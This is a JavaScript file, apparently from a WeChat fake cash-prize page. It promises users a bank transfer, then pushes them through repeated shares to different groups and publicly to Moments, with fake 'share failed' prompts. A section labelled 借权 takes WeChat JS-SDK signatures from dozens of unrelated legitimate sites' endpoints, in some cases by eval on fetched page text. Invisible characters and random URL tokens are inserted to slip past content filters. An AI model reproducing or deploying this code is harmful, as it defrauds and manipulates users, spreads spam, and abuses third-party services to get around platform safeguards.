window['data'] = window['data'] || {};
window.gConfig = $.extend({
  endPageUrl: 'javascript:WeixinJSBridge.call("closeWindow");',
  // endPageUrl: 'http://m1.tuniucdn.com/fb2/t1/G5/M00/FD/03/Cii-s1s1vLaIR3iWAAAAlO4kMEYAAG3DQP__nQAAAGM31.html?fsrc=dz&type=nk',
  defaultTips: [
    '<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/>',
    '<span>您获得现金红包</span><br/>',
    '<span style="font-size: 20px;color:red;">%(money)元</span><br/>',
    '<span style="color:red;">活动宗旨为答谢更多的粉丝，分享到群后</span><span  style="color:red; font-size: 25px;">即可领取</span><br/>',
    // '<span style="color:red;">群人数>50人可额外奖励18元</span><br/>',
    '<span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">838.3万</span>元，先到先得，马上分享领取到账！<br/>',
  ].join(''),
  successTips: [
    '<b style="font-size: 22px;color: red;">恭喜您</b><br>',
    '获得￥ <span style="font-size: 20px;color: red;">%(money)</span> 现{fuck}金{fuck}红҈ {fuck}包҈ ，'.replace(/{fuck}/ig, '\u034f'),
    '金额已提交银行打款，预计1{fuck}小时内到账，请注意查收微{fuck}信{fuck}绑定银{fuck}行{fuck}卡到账情况！<br><span style="font-size: 18px;color:red;">注意:打款期间请勿删除分享信息</span>'.replace(/{fuck}/ig, '\u034f'),
  ].join(''),
  groupTips: [{
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
    },
    {
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群<br/><span style="color:red;">红包将立即到账！</span>',
    },
    {
      successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
      successTips: '<br>注意：<span color="red">分享到相同的群会失败</span><br>请尝试重新分享到<b style="font-size: 18px;color: red">1个不同的群</b><br>',
    },
    /* {
       successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
       successTips: '剩下最后一步啦！<br />请分享到<b style="color: red;">人数大于50人</b>的微信群，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
     },*/
    {
      successTitle: '<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b>',
      successTips: '剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，获赠<b style="font-size: 18px;color: red;">{moneyStr}</b>元💰立即到账！',
    },
  ],
  timeLineTips: [{
    successTitle: '<b style="font-size: 22px;color: red;">分享失败！</b>',
    successTips: '<br>注意：必须[<span color="red">公开</span>]分享哦!<br>请尝试重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>',
  }, ]
}, (window['data']));
var evkey = M.getParam('_evkey');
var site = M.getParam('_c');

if (/iphone/ig.test(navigator.userAgent) && window.data && window.data['attached'] && window.data['attached']['iosGoAdUrl']) {
  location.href = window.data['attached']['iosGoAdUrl'];
}

/* 借权start */
var get_share_host = 'haiwaibbm.cn';
var location_host = location.host;

var biaoqing = ["😺", "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "🙌", "👏", "👋", "👍", "👎", "👊", "✊", "✌️", "👌", "✋", "👐", "💪", "🙏", "☝️", "👆", "👇", "👈", "👉", "🖕", "🖐", "🤘", "🖖", "✍️", "💅", "👄", "👅", "👂", "👃", "👁", "👀", "👤", "👥", "🗣", "👶", "👦", "👧", "👨", "👩", "👱", "👴", "👵", "👲", "👳", "👮", "👷", "💂", "🕵", "🎅", "👼", "👸", "👰", "🚶", "🏃", "💃"];
var bq = biaoqing[Math.floor(Math.random() * biaoqing.length)];

function checkIsMp() {
  if (window.data && window.data['attached'] && window.data['attached']['isMp']) {
    return true;
  } else {
    return false;
  }
}

function getCity() {
  return (window['localAddress'] ? ['北京市', '天津市', '上海市', '重庆市'].indexOf(localAddress.province) > -1 ? localAddress.province : localAddress.city : '').replace(/(.*)市/, '$1');
}

function randomOneFromList(list) {
  if (list && list.length > 0) {
    return list[Math.floor(Math.random() * list.length)];
  } else {
    return '';
  }
}

function getSpm() {
  var stringArray = 'qwertyuiopasdfghjklzxcvbnm1234567890';
  var spm = []
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  spm.push(stringArray.charAt(Math.floor(Math.random() * stringArray.length)));
  return spm.join('');
}


function pad(num, size) {
  var s = num + "";
  while (s.length < size) s = "0" + s;
  return s;
}

function getFuck163() {
  var strList = [];
  for (var i = 0; i < 5; i++) {
    strList.push('%' + pad(1 + Math.round(Math.random() * 18), 2));
  }
  return strList.join('');
}

function addJumpToUrl(jump) {
  if (location.host.indexOf('m.ymatou.com') > -1) {
    return 'https://www.ymatou.com/login/logout?' + getSpm() + '=' + getSpm() + '&ret=' + encodeURIComponent(jump);
  } else if (location.host.indexOf('my.lotour.com') > -1) {
    return 'http://www.lotour.com/app/WeixinBack?id=1233&' + getSpm() + '=' + getSpm() + '&state=' + encodeURIComponent(jump);
  } else {
    return jump;
  }
}

/* 借权end */
function record(event, id, allow_reply) {

}

/*window.g_displayUrl = '';

function getDisplayUrl (callback) {
  $.get('https://api.51bjbj.com./j?out=url', function (target) {
    if (target) {
      window.g_displayUrl = M.addParam(target, {
        'ac': 'goon'
      });
    }
    if (typeof callback === 'function') {
      callback();
    }
  });
}

function jumpToDisplay () {
  if (window.g_displayUrl) {
    jump_noref(window.g_displayUrl);
  } else {
    getDisplayUrl(function () {
      if (window.g_displayUrl) {
        jump_noref(window.g_displayUrl);
      }
    });
  }
}*/

function showShareTips(obj) {
  if (typeof obj === 'object') {
    g_dialog.alert({
      title: obj.successTitle || '',
      message: obj.successTips,
      btn: '我知道了'
    });
  } else if (typeof obj === 'string' && obj) {
    g_dialog.alert({
      title: '',
      message: obj,
      btn: '我知道了'
    });
  }
}

// 分享
(function () {

  var group_ad = false;
  var timeline_ad = false;
  var shareATimes = 0;
  var shareTTimes = 0;

  function share_tip() {
    // 4次群 2次朋友圈
    if (shareATimes == 0) {
      showShareTips(window.g_tips_message_obj);
    } else if (shareATimes == 1) {
      window.g_tips_message_obj = gConfig.groupTips[0];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else if (shareATimes == 2) {
      window.g_tips_message_obj = gConfig.groupTips[1];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else if (shareATimes == 3) {
      window.g_tips_message_obj = gConfig.groupTips[2];
      showShareTips(window.g_tips_message_obj);
      shareFriend();
    } else {
      if (shareTTimes < 1) {
        window.g_tips_message_obj = gConfig.groupTips[3];
        showShareTips(window.g_tips_message_obj);
        show_timeline_menu();
        shareTimeline();
        $('.js_share_to_desc').text('朋友圈');
      } else {
        shareTimeline();
        if (shareATimes < 4) {
          window.g_tips_message_obj = {
            successTips: '<b style="font-size: 30px;color: #f5294c">分享失败</b><br>请先分享到<b style="font-size: 30px;color: #f5294c">微信群</b>即可领取成功!'
          };
          showShareTips(window.g_tips_message_obj);
          showShareTips();
          return;
        }

        if (shareTTimes == 1 && timeline_ad) {
          window.g_tips_message_obj = gConfig.timeLineTips[0];
          showShareTips(window.g_tips_message_obj);
        } else {
          try {
            $(document.body).trigger('event_page_share_done');
          } catch (e) {

          }
        }
      }
    }


  }

  function timeline_callback() {
    if (shareATimes >= 3) {
      shareTTimes += 1;
    }
    share_tip();
    record('share', site, true);
    record('share-uv', site);
    evkey && record('share', evkey, true);
    evkey && record('share-uv', evkey);
  }

  function appmessage_callback() {
    shareATimes += 1;
    share_tip();
    record('share', site, true);
    record('share-uv', site);
    evkey && record('share', evkey, true);
    evkey && record('share-uv', evkey);
  }

  function shareFriend() {
    var result = window.data.to_group;
    if (window.data.attached['ad_share']['qun'][shareATimes]) {
      result = {
        'title': window.data['ad']['title'],
        'link': window.data['ad']['app_url'],
        'img': window.data['ad']['img'],
        'desc': window.data['ad']['desc']
      }
    }
    console.log(result)
    if (window.data.attached.signmode == 'jsb') {
      WeixinJSBridge.on('menu:share:appmessage', function (argv) {
        WeixinJSBridge.invoke('sendAppMessage', {
          "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "link": result.link.replace(/{fuck163}/ig, getFuck163()),
          "img_url": result.img,
          "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        }, function (res) {
          if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
            appmessage_callback();
          }
        });
      });

    } else {
      wx.ready(function () {

        var link = result.link;
        if (checkIsMp()) {
          link = g_shareData['jssdk']['groupUrl'] || link;
          if (window.data.attached['ad_share']['qun'][shareATimes] && g_shareData['jssdk']['cashUrl']) {
            link = g_shareData['jssdk']['cashUrl'];
          }
        }

        wx.onMenuShareAppMessage({
          title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          link: link.replace(/{fuck163}/ig, getFuck163()),
          desc: result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          imgUrl: result.img,
          dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
          success: function () {
            appmessage_callback();
          },
          cancel: function () {}
        });
      })
    }
  }

  function shareTimeline(result) {
    var result = window.data.to_timeline;
    if (window.data.attached['ad_share']['pyq'][shareTTimes]) {
      result = {
        'title': window.data['ad']['desc'],
        'link': window.data['ad']['timeline_url'],
        'img': window.data['ad']['img'],
        'desc': window.data['ad']['desc']
      }
    }
    console.log(result);
    if (window.data.attached.signmode === 'jsb') {
      WeixinJSBridge.on('menu:share:timeline', function (argv) {
        var __shareData = {
          "title": result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "desc": result.desc.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          "link": result.link.replace(/{fuck163}/ig, getFuck163()),
          "img_url": result.img,
          "dataUrl": "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
        };
        if (result.img.indexOf('typeVideo') > -1) {
          __shareData.type = 'video';
        }
        WeixinJSBridge.invoke('shareTimeline', __shareData, function (res) {
          if (/ok|confirm/i.test(res.err_msg || res.errMsg)) {
            timeline_callback();
          }
        });
      });
    } else {
      wx.ready(function () {

        var link = result.link;
        if (checkIsMp()) {
          link = g_shareData['jssdk']['timelineUrl'] || result.link;
          if (window.data.attached['ad_share']['pyq'][shareTTimes] && g_shareData['jssdk']['cashUrl']) {
            link = g_shareData['jssdk']['cashUrl'];
          } else {
            if (shareTTimes >= 1) {
              result = {
                'title': '{fuck}庆祝流浪地球票房破45亿，吴总任性派钱啦，快来试试手{fuck}气吧！',
                'link': g_shareData['jssdk']['timelineUrl'],
                'img': 'https://butuyu.oss-cn-hangzhou.aliyuncs.com/images/lldq.jpg',
                'desc': '',
                'type': 'video'
              }
            }
          }
        }

        wx.onMenuShareTimeline({
          title: result.title.replace('{city}', getCity()).replace(/{fuck}/ig, '\u034f').replace(/{bq}/ig, bq),
          link: link.replace(/{fuck163}/ig, getFuck163()),
          imgUrl: result.img,
          dataUrl: "http://fs.ringop.kugou.com/G132/M0B/0C/1B/xA0DAFqPht2AGh9BACJOIM_Aa8U043.mp3",
          type: 'video',
          success: function () {
            timeline_callback();
          },
          cancel: function () {}
        });
      })
    }
  }

  function show_timeline_menu() {
    if (window.data.attached.signmode == 'jssdk') {
      if (location_host.indexOf('dangdang.com') > -1) {} else {
        wx.hideOptionMenu();
      }
      if (M.getParam('debugx') === '1') {
        wx.showMenuItems({
          menuList: [
            'menuItem:share:timeline',
            'menuItem:share:appMessage',
          ]
        });
      } else {
        wx.showMenuItems({
          menuList: ['menuItem:share:timeline']
        });
      }
    }
  }

  function ymatou_config() {

    window['ymatou_config_callback'] = function (data) {
      jssdk_config({
        appId: data['AppId'],
        timestamp: data['TimeStamp'],
        nonceStr: data['NonceStr'],
        signature: data['Signature'],
      });
    }
    var url = 'https://m.ymatou.com/GetJsSignature.aspx?';
    url += 'v=' + (+new Date());
    url += '&appId=wxa06ebe9f39751792';
    url += '&callback=ymatou_config_callback';
    url += '&u=' + encodeURIComponent(location.protocol + '//' + location.host + location.pathname + location.search);
    $.getScript(url)
  }

  function sina_config() {
    $.post('http://blog.sina.cn/dpool/blog/newblog/riaapi/mblog/wechat.php', {
      original_url: location.href.split('#')[0]
    }, function (d) {
      d = JSON.parse(d);
      var config = d.data;
      jssdk_config(config);
    });
  }

  function dajie_config() {
    $.get('', function (d) {
      var ms = d.match(/var\s+js_sdk_config\s+=\s+\{[^\}]+\};/).toString();
      // var ms = (/js_sdk_config = [\s\S]*?};/gm)['toString']()
      eval(ms);
      jssdk_config(js_sdk_config);
    });
  }

  function meipian_config() {
    $.post('https://www.meipian.cn/promo/poetry_game/api/shareParams', {
      url: location.href.split('#')[0]
    }, function (d) {
      var config = d.data;
      config['appId'] = config['appid'];
      config['nonceStr'] = config['noncestr'];
      jssdk_config(config);
    })
  }

  function shijue_config() {
    var config = {
      appId: wxinfo.appid,
      nonceStr: wxinfo.nonceStr,
      signature: wxinfo.signature,
      timestamp: wxinfo.timestamp
    };

    jssdk_config(config);
  }

  function lotour_config() {
    window['ymatou_config_callback'] = function (data) {
      jssdk_config(data);
    }
    var url = 'http://wx.lotour.com/WxCommon/WxAPI.ashx?';
    url += 'v=' + (+new Date());
    url += '&callback=ymatou_config_callback';
    url += '&curl=' + encodeURIComponent(location.protocol + '//' + location.host + location.pathname + location.search);
    $.getScript(url)
  }

  function jumei_config() {
    $.ajax({
      type: "GET",
      url: 'http://h5.jumei.com/activity/weixin/getWeixinSignV2?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d.result;
        config['appId'] = 'wx21564a7188284dea';
        config['nonceStr'] = config['noncestr'];
        config['signature'] = config['sign'];
        jssdk_config(config);
      }
    });
  }

  function fang_config() {
    $.ajax({
      type: "GET",
      url: '//m.fang.com/huodongAC.d?m=wxShareInfo&class=ActivityIExpiresinTimeMc&shareurl=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    });
  }

  function _rabbitpre_config() {
    $.ajax({
      type: "GET",
      url: 'https://a3.rabbitpre.com/api2/share/signature?pageUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&shareUrl=' + encodeURIComponent(location.href.split('#')[0]) + '&isAjax=true',
      dataType: "json",
      data: {},
      success: function (d) {
        if (d && d.data) {
          jssdk_config(d.data);
        }
      }
    });
  }

  function mafengwo_config() {
    $.ajax({
      type: "GET",
      url: 'https://m.mafengwo.cn/sales/activity/flightpromotion/ajax_data/weChatShare?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config(d.data)
      }
    });
  }

  function c_17173_config() {
    $.ajax({
      type: "GET",
      url: 'https://act.17173.com/weixin/index.php?do=weixin&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d;
      }
    });
  }

  function chanyou_config() {
    $.ajax({
      type: "GET",
      url: 'https://ylruiji.com/sign?site=17173&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config(d);
      }
    });
  }

  function banggo_config() {
    $.ajax({
      type: "GET",
      url: 'https://mact.banggo.com/index/getWeixinJsConfig.shtml?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      data: {},
      success: function (d) {
        jssdk_config({
          appId: d.data.appId,
          timestamp: d.data.timestamp,
          nonceStr: d.data.nonceStr,
          signature: d.data.signature,
        });
      }
    });

  }

  function house365_config() {
    $.ajax({
      type: "GET",
      url: 'https://m.house365.com/index.php?m=Home&c=Html&a=getBaseInfo&city=nj&is_weixin=1&url=' + encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        d = d.wx;
        var config = {
          appId: d.appId, // 必填，公众号的唯一标识
          timestamp: d.timestamp, // 必填，生成签名的时间戳
          nonceStr: d.nonceStr, // 必填，生成签名的随机串
          signature: d.signature
        };
        jssdk_config(config);
      }
    });
  }

  function artron_config() {
    alert(2);
    $.ajax({
      type: "GET",
      url: 'https://m-exhibit.artron.net/comment/jssdktwo?rnd=' + (+new Date()),
      dataType: "json",
      data: {},
      success: function (d) {
        alert(JSON.stringify(d));
        jssdk_config(d.data);
      }
    });
  }

  function hexun_config() {
    $.ajax({
      type: "GET",
      url: 'https://ylruiji.com/sign?site=hexun&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config(d);
      }
    });
  }

  function gzl_config() {
    $.ajax({
      type: "GET",
      url: 'http://weixin.gzl.cn/jssdkconfig/getConfig.json?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        d.nonceStr = d.noncestr;
        jssdk_config(d);
      }
    });
  }

  function zhiye_config() {
    $.ajax({
      type: "GET",
      url: 'https://ylruiji.com/sign?site=zhiye&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config({
          appId: d.AppId,
          timestamp: d.TimeStamp,
          nonceStr: d.NonceStr,
          signature: d.Signature,
        });
      }
    });
  }

  function zcool_config() {
    $.ajax({
      type: "GET",
      url: '//m.zcool.com.cn/special/weixinShare.do?addr=',
      dataType: "json",
      data: {},
      success: function (d) {
        jssdk_config({
          appId: d.appid,
          timestamp: d.timestamp,
          nonceStr: d.nonceStr,
          signature: d.signature,
        });
      }
    });
  }

  function music_163_config() {
    $.ajax({
      type: "GET",
      url: '//music.163.com/store/api/wechat/auth/jssdk/info?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    });
  }

  function kujiale_config() {
    $.ajax({
      type: "GET",
      url: '//www.kujiale.com/weixin/js/signature?url=' + encodeURIComponent(location.href.split('#')[0]),
      data: {},
      success: function (d) {
        if (typeof d === 'string') {
          d = JSON.parse(d);
        }
        jssdk_config({
          appId: d.appId,
          timestamp: d.timestamp,
          nonceStr: d.noncestr,
          signature: d.signature,
        });
      }
    });
  }

  function chinahr_config() {
    $.ajax({
      type: "GET",
      url: '//wezp.chinahr.com/js/sign?rawurl=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        jssdk_config({
          appId: d.appid,
          timestamp: d.timestamp,
          nonceStr: d.nonceStr,
          signature: d.signature,
        });
      }
    });
  }

  function ifeng_config() {
    $.ajax({
      type: "GET",
      url: '//api.3g.ifeng.com/weishare_token_api?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        jssdk_config({
          appId: d.appId,
          timestamp: d.timestamp,
          nonceStr: d.nonceStr,
          signature: d.signature,
        });
      }
    });
  }

  function sougou_config() {
    $.ajax({
      type: "GET",
      url: 'https://05ez.com/jq/sougo?url=' + encodeURIComponent(location.href.split('#')[0]),

      dataType: "json",
      success: function (data) {
        jssdk_config({
          appId: 'wxc3f3393910d0d5f6',
          timestamp: data.data.timestamp,
          nonceStr: 'sogoubaike',
          signature: data.data.sig,
        });
      }
    });
  }


  function map_sogo_config() {
    $.ajax({
      type: "GET",
      url: 'https://05ez.com/jq/sougo/map?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      success: function (data) {
        jssdk_config({
          appId: data.appId,
          timestamp: data.timestamp,
          nonceStr: data.nonceStr,
          signature: data.signature,
        });
      }
    });
  }

  function focus_config() {
    $.ajax({
      type: "GET",
      url: '//wx-open-api.focus.cn/ajax/wxJsConfig?sceneType=1&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "json",
      data: {},
      success: function (d) {
        var config = d.data;
        jssdk_config(config);
        /*setTimeout(function () {
          jssdk_config(config);
        }, 500);
        setTimeout(function () {
          jssdk_config(config);
        }, 1000);
        setTimeout(function () {
          jssdk_config(config);
        }, 2000);*/
      }
    });
  }

  function che_config() {
    $.ajax({
      type: "GET",
      url: 'http://service.58che.com/Wxshare/share/?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    });
  }

  function zol_config() {
    $.getScript('//ylruiji.com/sign?site=zol&url=' + encodeURIComponent(location.href.split('#')[0]), function () {
      var config = window.WeixinShareData;
      jssdk_config(config);
    });
  }

  function douyu_config() {
    $.post('https://yubam.douyu.com/ybapi/interaction/getsignpackage', {
      signurl: location.href.split('#')[0]
    }, function (d) {
      d = JSON.parse(d);
      var config = {
        appId: d.appid,
        signature: d.signature,
        timestamp: d.timestamp,
        nonceStr: d.nonceStr
      };

      jssdk_config(config);
    });
  }

  function seeyouyima_config() {
    $.ajax({
      type: "GET",
      url: 'https://view.seeyouyima.com/api/wechat?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d.data;
        jssdk_config(config);
      }
    });
  }

  function mia_config() {
    $.ajax({
      type: "GET",
      url: 'https://m.mia.com/wx/share/wx_sign/?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function () {
        if (window.wx_sign) {
          var d = wx_sign.signPackage;
          var config = {
            appId: d.appId,
            timestamp: d.timestamp,
            nonceStr: d.nonceStr,
            signature: d.signature
          };
          jssdk_config(config);
        }
      }
    });
  }

  function huajiao_config() {
    $.getJSON('https://h.huajiao.com/wx/getConfig', function (d) {
      var config = d.data.config;
      jssdk_config(config);
    });
  }

  function dangdang_config() {
    $.getScript('//e.dangdang.com/weixin/getInfo.php?src_url=' + encodeURIComponent(location.href.split('#')[0]));

    setTimeout(function () {
      shareFriend();
      shareTimeline();
    }, 1000);
    setTimeout(function () {
      shareFriend();
      shareTimeline();
    }, 3000);

  }

  function bama555_config() {
    $.ajax({
      type: "GET",
      url: 'http://cyzssj.bama555.com/data/wechatjsapi?url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d.data;
        jssdk_config(config);
      }
    });
  }

  function jia_config() {
    $.ajax({
      type: "GET",
      url: '//weixin.jia.com/api/weixinjssdk/getConfigInfo?url=' + encodeURIComponent(encodeURIComponent(location.href.split('#')[0])),
      dataType: "jsonp",
      jsonp: "callbackparam",
      data: {},
      success: function (d) {
        var config = d.result;
        jssdk_config({
          appId: config.appId,
          timestamp: config.timestamp,
          nonceStr: config.nonceStr,
          signature: config.signature,
        });
      }
    });
  }

  function wenjuan_config() {

    $.getJSON('https://ylruiji.com/sign?site=wenjuan&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d;
      jssdk_config(config)
    });
  }

  function pingan_config() {
    $.getJSON('https://m.health.pingan.com/mapi/signature.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1551091706759&app=0&platform=3&app_key=PAHealth&osversion=23&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=UMENG_CHANNEL_VALUE&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = {
        appId: d.appid,
        nonceStr: d.nonceStr,
        timestamp: d.timestamp,
        signature: d.signature
      };
      jssdk_config(config);
    });
    // $.ajax(
    //     {
    //         type: "GET",
    //         url: 'https://m.health.pingan.com/mapi/signature.json?deviceId=5a4c935cbb6ff6ca&deviceType=SM-G9300&timestamp=1551091706759&app=0&platform=3&app_key=PAHealth&osversion=23&version=1.0.1&resolution=1440x2560&screenSize=22&netType=1&channel=UMENG_CHANNEL_VALUE&url=' + encodeURIComponent(location.href.split('#')[0]),
    //         dataType: "jsonp",
    //         jsonp: "callback",
    //         callback: 'jsonp1',
    //         data: {},
    //         success: function (d) {
    //             var config = JSON.parse(d);
    //             jssdk_config({
    //                 'appId': 'wx95415c456652ce73',//wx40923f3ed820979d
    //                 'nonceStr': config['nonce'],
    //                 'timestamp': config['timestamp'],
    //                 'signature': config['signature']
    //             });
    //         }
    //     });
  }

  function leju_config() {
    $.ajax({
      type: "GET",
      url: 'https://m.leju.com/index.php?site=api&ctl=initjssdk&act=index&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config({
          'appId': config['appid'],
          'nonceStr': config['noncestr'],
          'timestamp': config['timestamp'],
          'signature': config['signature'],
        });
      }
    });
  }

  function inke_config() {
    $.ajax({
      type: "GET",
      url: '//actapi.busi.inke.cn/app/wx_share_config',
      dataType: "json",
      success: function (d) {
        var config = d.data;
        config['appId'] = config['appid'];
        config['nonceStr'] = config['noncestr'];
        jssdk_config(config);
      }
    });
  }

  function pchome_config() {
    function success(text) {
      var reg = /wx\.config\(([^\)]*)\)/;
      reg.test(text);
      var s = RegExp.$1;
      s = 'window.wx_config=' + s;
      eval(s);
      var config = window.wx_config;
      jssdk_config(config);
    }

    function fail(code) {}

    var request = new XMLHttpRequest(); // 新建XMLHttpRequest对象

    request.onreadystatechange = function () { // 状态发生变化时，函数被回调
      if (request.readyState === 4) { // 成功完成
        // 判断响应结果:
        if (request.status === 200) {
          // 成功，通过responseText拿到响应的文本:
          return success(request.responseText);
        } else {
          // 失败，根据响应码判断失败原因:
          return fail(request.status);
        }
      } else {
        // HTTP请求还在继续...
      }
    };

    // 发送请求:
    request.open('GET', '//ylruiji.com/sign?site=pchome&url=' + encodeURIComponent(location.href.split('#')[0]));
    request.send();
  }

  function weinisongdu_config() {
    $.getJSON('http://qmks.weinisongdu.com/getSignPackage?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d;
      jssdk_config(config);
    });
  }

  function shunfeng_config() {
    $.getJSON('https://ylruiji.com/sign?site=shunfeng&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = {
        appId: d.appId,
        timestamp: d.timestamp,
        nonceStr: d.noncestr,
        signature: d.signature
      };
      jssdk_config(config);
    });
  }

  function amap_config() {
    $.ajax({
      type: "GET",
      url: 'https://wb.amap.com/sign.php',
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d;
        jssdk_config(config);
      }
    });
  }

  function xinhuanet_config() {
    var currentUrl = location.href.split('#')[0];
    $.ajax({
      type: "GET",
      url: '//api.home.news.cn/wx/jsapi.do?mpId=356&url=' + encodeURIComponent(currentUrl),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d.content;
        if (d.content.url === currentUrl) {
          jssdk_config(config);
        } else {
          xinhuanet_config();
        }
      }
    });
  }

  function nos_config() {
    $.getScript('//wxsign.nie.netease.com/sharecom/wxjs.php?url=' + encodeURIComponent(location.href.split('#')[0]), function () {
      jssdk_config(wx_conf);
    });
  }

  function cyzone_config() {
    $.getJSON('http://api1.cyzone.cn/v1/member/tools/jsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d.data;
      jssdk_config(config);
    });
  }

  function baidu_config() {
    $.ajax({
      type: "GET",
      url: 'https://po.baidu.com/api/wechat/token.jsonp?app_id=wxadc1a0c6b9096e89&url=' + encodeURIComponent(location.href.split('#')[0]),
      dataType: "jsonp",
      jsonp: "callback",
      callback: 'jsonp1',
      data: {},
      success: function (d) {
        var config = d.data;
        jssdk_config(config);
        setTimeout(function () {
          jssdk_config(config);
        }, 500);
      }
    });
  }

  function haozu_config() {
    $.get('', function (html) {
      var reg = /wx\.config\(([^\)]*)\)/;
      reg.test(html);
      var s = RegExp.$1;
      s = 'window.wx_config=' + s;
      eval(s);
      var config = window.wx_config;
      jssdk_config(config);
      setTimeout(function () {
        jssdk_config(config);
      }, 500);
    });
  }

  function baihe_config() {
    $.getJSON('http://m.hunli.baihe.com/wechat/getJsSign?url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      var config = d.data.result;
      jssdk_config(config);
    });
  }

  function wx189_config() {
    $.getJSON('https://wechat.e.189.cn/api/wechat/jsapi/signature.do?cid=telecom_user_center&appid=21cn&url=' + encodeURIComponent(location.href.split('#')[0]), function (d) {
      jssdk_config({
        appId: d.appId,
        timestamp: d.timestamp,
        nonceStr: d.noncestr,
        signature: d.signature
      });
    });
  }

